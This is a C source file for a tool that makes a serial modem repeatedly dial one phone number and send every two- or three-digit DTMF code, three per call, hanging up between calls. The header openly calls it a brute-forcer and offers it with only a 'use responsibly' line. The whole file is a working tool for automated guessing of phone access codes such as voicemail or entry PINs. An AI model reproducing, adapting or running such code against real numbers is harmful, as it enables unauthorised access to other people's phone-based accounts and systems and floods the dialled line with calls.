/*
 * main.c
 *
 * Dial a phone number and brute-force DTMF sequences in batches of N iterations per call.
 *
 * Features:
 *  - getopt-based CLI:
 *      -d DEVICE   serial device (default: /dev/ttyS1)
 *      -b BAUD     baud rate (default: 57600)
 *      -r          read modem response after each send
 *      -t MS       read inactivity timeout in milliseconds (default: 1000)
 *      -p MS       pause between calls in milliseconds (default: 1000)
 *      -T          dry-run: print commands to screen but do not send to serial
 *
 * Build:
 *   gcc -std=c11 -Wall -Wextra -o main main.c
 *
 * Use responsibly.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <termios.h>
#include <errno.h>
#include <stdint.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>

#define DEFAULT_DEVICE "/dev/ttyS1"
#define DEFAULT_BAUD 57600
#define DEFAULT_TIMEOUT_MS 1000
#define DEFAULT_PAUSE_MS 1000

/* allocation heuristics */
#define APPROX_BASE 64
#define APPROX_PER_2DIG 32
#define APPROX_PER_3DIG 48

static void usage(const char *prog) {
    fprintf(stderr,
            "Usage: %s [options] <digits:2|3> <phonenumber>\n"
            "Options:\n"
            "  -d DEVICE   serial device (default: %s)\n"
            "  -b BAUD     baud rate (default: %d)\n"
            "  -r          read modem response after sending\n"
            "  -t MS       read inactivity timeout in milliseconds (default: %d)\n"
            "  -p MS       pause between calls in milliseconds (default: %d)\n"
            "  -T          dry-run: print commands to screen but do not send to serial\n",
            prog, DEFAULT_DEVICE, DEFAULT_BAUD, DEFAULT_TIMEOUT_MS, DEFAULT_PAUSE_MS);
}

/* Map common integer baud to termios speed_t (0 => unsupported) */
static speed_t baud_to_speed(int baud) {
    switch (baud) {
#ifdef B0
        case 0: return B0;
#endif
#ifdef B50
        case 50: return B50;
#endif
#ifdef B75
        case 75: return B75;
#endif
#ifdef B110
        case 110: return B110;
#endif
#ifdef B134
        case 134: return B134;
#endif
#ifdef B150
        case 150: return B150;
#endif
#ifdef B200
        case 200: return B200;
#endif
#ifdef B300
        case 300: return B300;
#endif
#ifdef B600
        case 600: return B600;
#endif
#ifdef B1200
        case 1200: return B1200;
#endif
#ifdef B1800
        case 1800: return B1800;
#endif
#ifdef B2400
        case 2400: return B2400;
#endif
#ifdef B4800
        case 4800: return B4800;
#endif
#ifdef B9600
        case 9600: return B9600;
#endif
#ifdef B19200
        case 19200: return B19200;
#endif
#ifdef B38400
        case 38400: return B38400;
#endif
#ifdef B57600
        case 57600: return B57600;
#endif
#ifdef B115200
        case 115200: return B115200;
#endif
#ifdef B230400
        case 230400: return B230400;
#endif
        default:
            return (speed_t)0;
    }
}

/* Ensure the buffer has at least `need` bytes capacity. Resize by doubling. */
static int ensure_capacity(char **bufp, size_t *capp, size_t need) {
    if (*capp >= need) return 0;
    size_t newcap = (*capp == 0) ? 256 : *capp * 2;
    while (newcap < need) newcap *= 2;
    char *nb = realloc(*bufp, newcap);
    if (!nb) return -1;
    *bufp = nb;
    *capp = newcap;
    return 0;
}

/* Append formatted data into buf at position *pos, growing the buffer as needed.
 * Returns number of bytes appended (excluding terminating NUL), or -1 on error.
 */
static int appendf(char **bufp, size_t *capp, size_t *pos, const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    va_list ap2;
    va_copy(ap2, ap);
    int needed = vsnprintf(NULL, 0, fmt, ap2);
    va_end(ap2);
    if (needed < 0) { va_end(ap); return -1; }
    size_t need_total = *pos + (size_t)needed + 1;
    if (ensure_capacity(bufp, capp, need_total) != 0) { va_end(ap); return -1; }
    int written = vsnprintf(*bufp + *pos, *capp - *pos, fmt, ap);
    va_end(ap);
    if (written < 0) return -1;
    *pos += (size_t)written;
    return written;
}

/* Build a single call's AT command that dials phone and sends combos[start..end-1].
 * Returns a malloc'd string (caller must free) or NULL on error.
 *
 * Format: ATDT<phone>;AT+VTD=1; (for each combo) AT+VTS=x;... ,; \r
 */
static char *build_batch_command(int num_digits, const char *phone, int start, int end) {
    if (!phone || start >= end) return NULL;
    int combos = end - start;
    size_t phone_len = strlen(phone);
    size_t approx_per = (num_digits == 3) ? APPROX_PER_3DIG : APPROX_PER_2DIG;
    size_t cap = APPROX_BASE + phone_len + (size_t)combos * approx_per + 8;
    char *buf = malloc(cap);
    if (!buf) return NULL;
    size_t pos = 0;
    int r = appendf(&buf, &cap, &pos, "ATDT%s;AT+VTD=1;", phone);
    if (r < 0) { free(buf); return NULL; }

    for (int idx = start; idx < end; ++idx) {
        if (num_digits == 3) {
            if (appendf(&buf, &cap, &pos, "AT+VTS=%d;AT+VTS=%d;AT+VTS=%d,;",
                        idx / 100, (idx / 10) % 10, idx % 10) < 0) {
                free(buf);
                return NULL;
            }
        } else {
            if (appendf(&buf, &cap, &pos, "AT+VTS=%d;AT+VTS=%d,;", idx / 10, idx % 10) < 0) {
                free(buf);
                return NULL;
            }
        }
    }

    if (ensure_capacity(&buf, &cap, pos + 2) != 0) { free(buf); return NULL; }
    buf[pos++] = '\r';
    buf[pos] = '\0';
    return buf;
}

/* Open serial device and return fd or -1 */
static int open_serial(const char *device) {
    int fd = open(device, O_RDWR | O_NOCTTY | O_SYNC);
    if (fd < 0) {
        fprintf(stderr, "open(%s): %s\n", device, strerror(errno));
        return -1;
    }
    return fd;
}

/* Configure serial port for raw 8N1 no-flow-control. If speed == 0, do not set speeds. */
static int configure_serial(int fd, speed_t speed) {
    struct termios tty;
    if (tcgetattr(fd, &tty) != 0) { perror("tcgetattr"); return -1; }
    if (speed != (speed_t)0) {
        if (cfsetispeed(&tty, speed) != 0 || cfsetospeed(&tty, speed) != 0) {
            perror("cfset[io]speed");
        }
    }

    tty.c_cflag &= ~PARENB;
    tty.c_cflag &= ~CSTOPB;
    tty.c_cflag &= ~CSIZE;
    tty.c_cflag |= CS8;

    tty.c_cflag &= ~CRTSCTS;
    tty.c_cflag |= (CLOCAL | CREAD);

    tty.c_lflag &= ~(ICANON | ECHO | ECHOE | ISIG);
    tty.c_oflag &= ~OPOST;

    tty.c_cc[VMIN] = 0;
    tty.c_cc[VTIME] = 10; /* 1s */

    if (tcsetattr(fd, TCSANOW, &tty) != 0) { perror("tcsetattr"); return -1; }
    return 0;
}

/* Write all bytes robustly */
static ssize_t write_all(int fd, const char *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t w = write(fd, buf + total, len - total);
        if (w < 0) {
            if (errno == EINTR) continue;
            perror("write");
            return -1;
        }
        if (w == 0) break;
        total += (size_t)w;
    }
    if (tcdrain(fd) != 0) perror("tcdrain");
    return (ssize_t)total;
}

/* Read until inactivity timeout_ms elapses. Caller must free *out_buf if bytes>0.
 * Returns bytes read (>0), 0 if none, -1 on error.
 */
static ssize_t read_response(int fd, char **out_buf, int timeout_ms) {
    if (!out_buf) return -1;
    *out_buf = NULL;
    size_t cap = 1024, len = 0;
    char *buf = malloc(cap);
    if (!buf) return -1;

    struct timeval tv;
    fd_set rfds;
    for (;;) {
        FD_ZERO(&rfds);
        FD_SET(fd, &rfds);
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int rv = select(fd + 1, &rfds, NULL, NULL, &tv);
        if (rv < 0) { if (errno == EINTR) continue; perror("select"); free(buf); return -1; }
        if (rv == 0) break; /* inactivity */
        if (FD_ISSET(fd, &rfds)) {
            char tmp[1024];
            ssize_t r = read(fd, tmp, sizeof(tmp));
            if (r < 0) { if (errno == EINTR) continue; perror("read"); free(buf); return -1; }
            if (r == 0) break;
            if (len + (size_t)r + 1 > cap) {
                size_t newcap = cap * 2;
                while (newcap < len + (size_t)r + 1) newcap *= 2;
                char *nb = realloc(buf, newcap);
                if (!nb) { perror("realloc"); free(buf); return -1; }
                buf = nb; cap = newcap;
            }
            memcpy(buf + len, tmp, (size_t)r);
            len += (size_t)r;
            continue;
        }
    }

    if (len == 0) { free(buf); *out_buf = NULL; return 0; }
    buf[len] = '\0';
    *out_buf = buf;
    return (ssize_t)len;
}

/* Sleep for ms milliseconds */
static void msleep(int ms) {
    if (ms <= 0) return;
    usleep((useconds_t)ms * 1000);
}

/* Allow -T anywhere by pre-scanning argv for "-T" entries and removing them
 * before getopt runs. This makes -T usable even after positional args.
 */
int main(int argc, char *argv[]) {
    int opt;
    const char *device = DEFAULT_DEVICE;
    int baud = DEFAULT_BAUD;
    int do_read = 0;
    int timeout_ms = DEFAULT_TIMEOUT_MS;
    int pause_ms = DEFAULT_PAUSE_MS;
    int dry_run = 0;

    /* Pre-scan argv and remove any "-T" occurrences so getopt will parse options
     * reliably even if -T appears after non-option arguments. */
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-T") == 0) {
            dry_run = 1;
            /* shift left */
            for (int j = i; j < argc - 1; ++j) argv[j] = argv[j + 1];
            argc--;
            argv[argc] = NULL;
            i--; /* re-check this index after shift */
            if (argc <= 1) break;
        }
    }

    /* Now parse remaining options normally */
    while ((opt = getopt(argc, argv, "d:b:rt:p:T")) != -1) {
        switch (opt) {
            case 'd': device = optarg; break;
            case 'b': baud = atoi(optarg); if (baud <= 0) { fprintf(stderr, "Invalid baud\n"); return 1; } break;
            case 'r': do_read = 1; break;
            case 't': timeout_ms = atoi(optarg); if (timeout_ms < 0) { fprintf(stderr, "Invalid timeout\n"); return 1; } break;
            case 'p': pause_ms = atoi(optarg); if (pause_ms < 0) { fprintf(stderr, "Invalid pause\n"); return 1; } break;
            case 'T': dry_run = 1; break; /* also handle if user specified it normally */
            default: usage(argv[0]); return 1;
        }
    }

    if (optind + 2 != argc) { usage(argv[0]); return 1; }

    int num_digits = atoi(argv[optind]);
    if (num_digits != 2 && num_digits != 3) { fprintf(stderr, "Digits must be 2 or 3\n"); return 1; }
    const char *phone = argv[optind + 1];

    int max_combos = (num_digits == 3) ? 1000 : 100;

    int fd = -1;
    speed_t sp = baud_to_speed(baud);
    if (sp == (speed_t)0) fprintf(stderr, "Warning: baud %d not mapped to termios constant; attempting to configure anyway\n", baud);
    if (!dry_run) {
        fd = open_serial(device);
        if (fd < 0) return 1;
        if (configure_serial(fd, sp) != 0) { close(fd); return 1; }
    }

    const int batch_size = 3;
    for (int i = 0; i < max_combos; i += batch_size) {
        int end = i + batch_size;
        if (end > max_combos) end = max_combos;

        char *cmd = build_batch_command(num_digits, phone, i, end);
        if (!cmd) { fprintf(stderr, "Failed to build batch command for combos %d..%d\n", i, end-1); break; }

        if (dry_run) {
            printf("DRY-RUN: batch %d..%d command:\n%s\n", i, end-1, cmd);
            free(cmd);
            continue;
        }

        ssize_t wrote = write_all(fd, cmd, strlen(cmd));
        if (wrote < 0) { fprintf(stderr, "Failed to send command for combos %d..%d\n", i, end-1); free(cmd); break; }
        printf("Sent call for combos %d..%d (%zd bytes)\n", i, end-1, wrote);

        if (do_read) {
            char *resp = NULL;
            ssize_t r = read_response(fd, &resp, timeout_ms);
            if (r < 0) {
                fprintf(stderr, "Error reading response after sending batch %d..%d\n", i, end-1);
            } else if (r == 0) {
                printf("No modem response for batch %d..%d within %d ms\n", i, end-1, timeout_ms);
            } else {
                printf("Modem response (%zd bytes):\n%s\n", r, resp);
                free(resp);
            }
        }

        free(cmd);

        /* Hang up the call */
        const char *hang = "ATH\r";
        ssize_t hw = write_all(fd, hang, strlen(hang));
        if (hw < 0) { fprintf(stderr, "Failed to send hangup after batch %d..%d\n", i, end-1); break; }

        msleep(pause_ms);
    }

    if (fd >= 0) close(fd);
    return 0;
}
